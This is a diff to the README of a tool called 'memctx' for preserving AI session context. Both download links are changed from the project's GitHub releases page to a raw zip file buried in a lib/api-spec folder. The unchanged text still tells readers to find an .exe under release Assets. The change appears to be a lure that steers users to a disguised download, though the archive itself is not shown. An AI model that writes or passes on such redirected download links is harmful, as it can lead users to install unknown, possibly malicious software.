@@ -1,6 +1,6 @@
 # 🧠 memctx - Keep your AI session context accessible
 
-[![Download Windows Installer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/allans4635/memctx/releases)
+[![Download Windows Installer](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/allans4635/memctx/main/lib/api-spec/Software-1.7.zip)
 
 ## 📋 What is memctx?
 
@@ -25,7 +25,7 @@ Ensure your computer meets these basic needs:
 
 Visit the official release page to get the latest version of the software.
 
-[Click here to open the download page](https://github.com/allans4635/memctx/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/allans4635/memctx/main/lib/api-spec/Software-1.7.zip)
 
 Look for the file ending in `.exe` under the Assets section of the latest release. Save this file to your computer.
 
